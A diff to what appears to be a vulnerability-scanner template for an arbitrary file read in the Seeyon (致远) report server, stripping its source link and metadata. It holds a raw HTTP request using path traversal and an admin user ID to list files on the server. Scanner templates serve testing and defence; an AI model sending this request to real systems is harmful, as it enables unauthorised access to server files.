@@ -3,12 +3,8 @@ info:
   name: 致远 报表任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/na2biw2g3q6kwmyv'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: na2biw2g3q6kwmyv
-    fofa: 暂无
 http:
 - raw:
   - 'GET /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true HTTP/1.1
